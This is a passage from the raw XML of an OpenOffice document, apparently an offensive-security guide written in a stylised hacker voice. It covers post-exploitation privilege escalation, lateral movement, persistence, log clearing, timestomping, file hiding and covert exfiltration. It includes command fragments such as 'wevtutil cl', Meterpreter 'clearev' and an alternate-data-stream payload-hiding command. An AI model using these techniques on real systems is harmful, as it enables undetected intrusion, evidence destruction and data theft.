            <text:p text:style-name="P34"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Statefulness:</text:span></text:span><text:span text:style-name="T1"> Fuzzing protocols or applications with complex state requirements can be difficult, as the fuzzer needs to maintain the correct state sequence. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P40">:: Intel Feed ::</text:p>
        <text:p text:style-name="P40">Fuzzing is directed chaos. Throw malformed data at the gates and listen for the screams. It finds the flaws developers missed, the edge cases they ignored. Dumb fuzzers saturate, smart fuzzers penetrate, evolutionary fuzzers explore. Monitor the target closely; a crash is a signal, the start of investigation, not the end.</text:p>
        <text:p text:style-name="Horizontal_20_Line"/>
        <text:h text:style-name="P41" text:outline-level="2"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">:: Sector 08: Post-Exploitation Operations ::</text:span></text:span></text:h>
        <text:p text:style-name="P6"><text:span text:style-name="T1">Initial access is merely crossing the threshold. True control requires solidifying your position, expanding your reach, and ensuring your presence remains undetected. Post-exploitation is a continuous cycle of reconnaissance, privilege escalation, lateral movement, persistence, and evasion </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">within</text:span></text:span><text:span text:style-name="T1"> the compromised environment.</text:span></text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Privilege Escalation</text:span></text:span></text:p>
        <text:p text:style-name="P6"><text:span text:style-name="T1">Your initial shell often runs with the limited privileges of the exploited service (e.g., </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">www-data</text:span></text:span><text:span text:style-name="T1"> for a web server) or user. Administrative (root/SYSTEM) access is usually required for deep system modification, credential dumping, and unimpeded lateral movement.</text:span></text:p>
        <text:list xml:id="list5741413767068519663" text:style-name="L29">
          <text:list-item>
            <text:p text:style-name="P35"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Kernel Exploits:</text:span></text:span><text:span text:style-name="T1"> Target vulnerabilities in the OS kernel itself. Success usually grants immediate root/SYSTEM privileges. Requires matching exploit to specific kernel version. (e.g., Dirty COW on Linux). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P35"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Service Misconfigurations:</text:span></text:span><text:span text:style-name="T1"> Exploiting services running as SYSTEM/root that have weak permissions, insecure configurations, or unquoted service paths. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P35"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Stored Credentials:</text:span></text:span><text:span text:style-name="T1"> Finding plaintext passwords or reusable hashes/tickets in files, scripts, or configuration settings accessible to the current user. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P35"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">DLL Hijacking:</text:span></text:span><text:span text:style-name="T1"> Placing a malicious DLL where the system expects to find a legitimate one, causing a higher-privilege process to load and execute attacker code. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P35"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Abusing SUID/GUID Binaries (Linux):</text:span></text:span><text:span text:style-name="T1"> Finding legitimate programs with the SUID/GUID bit set that can be manipulated to run arbitrary commands as the file's owner (often root). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P35"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Token Impersonation/Theft (Windows):</text:span></text:span><text:span text:style-name="T1"> Stealing access tokens from higher-privilege processes running on the same system. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="T1">Tools like </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">LinEnum.sh</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">unix-privesc-check</text:span></text:span><text:span text:style-name="T1"> (Linux), </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">PowerUp.ps1</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">winPEAS.bat</text:span></text:span><text:span text:style-name="T1"> (Windows), and Metasploit's </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">local_exploit_suggester</text:span></text:span><text:span text:style-name="T1"> can help identify potential escalation vectors.</text:span></text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Pivoting &amp; Lateral Movement</text:span></text:span></text:p>
        <text:p text:style-name="P1">Use the compromised system as a beachhead to access other systems or network segments previously unreachable.</text:p>
        <text:list xml:id="list3478669619522297763" text:style-name="L30">
          <text:list-item>
            <text:p text:style-name="P36"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Network Reconnaissance (Internal):</text:span></text:span><text:span text:style-name="T1"> Use tools (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">ipconfig</text:span></text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">ifconfig</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">arp -a</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">netstat</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">route print</text:span></text:span><text:span text:style-name="T1">) on the compromised host to map internal network topology, identify adjacent systems, and discover internal services. Nmap or other scanners can be run </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">from</text:span></text:span><text:span text:style-name="T1"> the compromised host. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P36"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Credential Reuse:</text:span></text:span><text:span text:style-name="T1"> Attempt harvested credentials (passwords, hashes via Pass-the-Hash, tickets via Pass-the-Ticket/Overpass-the-Hash) against other identified systems (SMB, SSH, RDP, WinRM). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P36"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Exploiting Trust Relationships:</text:span></text:span><text:span text:style-name="T1"> Abuse domain trust, Kerberos delegation, or service </text:span><text:soft-page-break/><text:span text:style-name="T1">dependencies to move between systems. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P36"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Port Forwarding/Proxying:</text:span></text:span><text:span text:style-name="T1"> Use tools like SSH tunnels, Meterpreter's </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">portfwd</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">netsh interface portproxy</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">socat</text:span></text:span><text:span text:style-name="T1"> to relay traffic through the compromised host, allowing attacker tools to reach internal-only systems. Metasploit's </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">autoroute</text:span></text:span><text:span text:style-name="T1"> script adds routes via Meterpreter sessions, enabling modules to target internal subnets directly. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Establishing Persistence</text:span></text:span></text:p>
        <text:p text:style-name="P1">Ensure continued access even if the initial exploit is patched, the system reboots, or the user logs out.</text:p>
        <text:list xml:id="list1520250105033052185" text:style-name="L31">
          <text:list-item>
            <text:p text:style-name="P37"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Registry Keys (Windows):</text:span></text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">Run</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">RunOnce</text:span></text:span><text:span text:style-name="T1"> keys (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">HKLM</text:span></text:span><text:span text:style-name="T1"> or </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">HKCU\Software\Microsoft\Windows\CurrentVersion\...</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P37"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Scheduled Tasks (Windows </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">schtasks</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">, Linux </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">cron</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">):</text:span></text:span><text:span text:style-name="T1"> Execute malicious code at specific times or system events (e.g., user logon, system boot). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P37"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Services (Windows </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">sc</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">, Linux </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">systemd</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">/</text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">init.d</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">):</text:span></text:span><text:span text:style-name="T1"> Create new services that launch malicious code with high privileges at boot. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P37"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Startup Folders (Windows):</text:span></text:span><text:span text:style-name="T1"> Placing executables/scripts in user or system startup folders. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P37"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">DLL Hijacking/Search Order Hijacking:</text:span></text:span><text:span text:style-name="T1"> Replacing legitimate DLLs or placing malicious ones earlier in the search path. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P37"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">WMI Event Subscriptions (Windows):</text:span></text:span><text:span text:style-name="T1"> Trigger malicious actions based on system events. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P37"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Logon Scripts/Shell Profiles (Linux </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">.bashrc</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">, </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">.profile</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">):</text:span></text:span><text:span text:style-name="T1"> Execute code upon user login. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P37"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Backdoors:</text:span></text:span><text:span text:style-name="T1"> Installing dedicated remote access trojans (RATs) or modifying legitimate remote access tools. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="T1">Metasploit offers persistence modules (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">exploit/windows/local/persistence</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">exploit/windows/local/registry_persistence</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">post/windows/manage/persistence_exe</text:span></text:span><text:span text:style-name="T1">) and Meterpreter's </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">metsvc</text:span></text:span><text:span text:style-name="T1"> (though deprecated).</text:span></text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Evasion &amp; Covering Tracks</text:span></text:span></text:p>
        <text:p text:style-name="P1">Minimize the forensic footprint and avoid detection by security tools (AV, EDR) and analysts.</text:p>
        <text:list xml:id="list3103883453917172133" text:style-name="L32">
          <text:list-item>
            <text:p text:style-name="P38"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Log Manipulation:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P38"><text:span text:style-name="T1">Clear event logs (Windows </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">wevtutil cl</text:span></text:span><text:span text:style-name="T1">, Meterpreter </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">clearev</text:span></text:span><text:span text:style-name="T1"> - requires high privileges and is often logged itself). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P38"><text:span text:style-name="T1">Selectively delete entries from text-based logs (Linux </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">/var/log/*</text:span></text:span><text:span text:style-name="T1"> - requires root). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P38"><text:span text:style-name="T1">Disable logging services temporarily (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">auditd</text:span></text:span><text:span text:style-name="T1">, EventLog service). </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P38"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Hiding Files:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P38"><text:soft-page-break/><text:span text:style-name="T1">Use standard hidden directories (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">.</text:span></text:span><text:span text:style-name="T1"> prefix on Linux, AppData on Windows). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P38"><text:span text:style-name="T1">NTFS Alternate Data Streams (ADS) (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">type payload.exe &gt; legitfile.txt:hidden.exe</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P5">Steganography (hiding data within seemingly benign files like images or audio). </text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P38"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Timestomping:</text:span></text:span><text:span text:style-name="T1"> Modify file timestamps (Modified, Accessed, Created - MAC times) to match legitimate files, hiding recent activity (Meterpreter </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">timestomp</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P38"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Memory Execution:</text:span></text:span><text:span text:style-name="T1"> Use techniques (PowerShell </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">IEX</text:span></text:span><text:span text:style-name="T1">, process injection) to run code directly in memory without writing executables to disk. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P38"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Rootkits:</text:span></text:span><text:span text:style-name="T1"> Kernel-level modifications to hide processes, files, network connections from the OS itself. Difficult to implement and detect. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P38"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Traffic Obfuscation:</text:span></text:span><text:span text:style-name="T1"> Encrypt C2 traffic (HTTPS, custom encryption), tunnel via common protocols (DNS, ICMP), use domain fronting. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Data Exfiltration</text:span></text:span></text:p>
        <text:p text:style-name="P1">The ultimate goal often involves stealing data. Exfiltrate sensitive information covertly.</text:p>
        <text:list xml:id="list7960721404364920902" text:style-name="L33">
          <text:list-item>
            <text:p text:style-name="P39"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Low and Slow:</text:span></text:span><text:span text:style-name="T1"> Transfer data gradually over extended periods to avoid triggering bandwidth alerts. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P39"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Covert Channels:</text:span></text:span><text:span text:style-name="T1"> Use protocols not typically monitored for large data transfers (DNS, ICMP). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P39"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Encryption:</text:span></text:span><text:span text:style-name="T1"> Encrypt stolen data before exfiltration. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P39"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Compression:</text:span></text:span><text:span text:style-name="T1"> Reduce data size before transfer. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P39"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Direct C2 Channel:</text:span></text:span><text:span text:style-name="T1"> Use existing command and control channel if bandwidth/detection allows. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P1">Post-exploitation is an art form requiring adaptability, deep system knowledge, and a paranoid focus on stealth. Each action must be weighed against the risk of detection.</text:p>
        <text:p text:style-name="P40">:: Intel Feed ::</text:p>
        <text:p text:style-name="P40">Access is the beginning, not the end. Elevate privileges to become the ghost in the machine. Move laterally like a shadow through trusted pathways. Establish persistence like a digital parasite. Erase your tracks meticulously. Exfiltrate data silently. The network is yours, but only if you remain unseen.</text:p>
        <text:p text:style-name="Horizontal_20_Line"/>
        <text:p text:style-name="P1">Transmission complete. The grid remembers intrusions. Obfuscate your presence. Decrypt the patterns. The signal fades.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9:22:10.12</meta:creation-date>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="19" meta:paragraph-count="307" meta:word-count="5752" meta:character-count="41749"/>
    <dc:date>2025-04-12T19:22:21.72</dc:date>
    <meta:editing-duration>PT12S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.15$Win32 OpenOffice.org_project/4115m2$Build-9813</meta:generator>
  </office:meta>
</office:document-meta>
</file>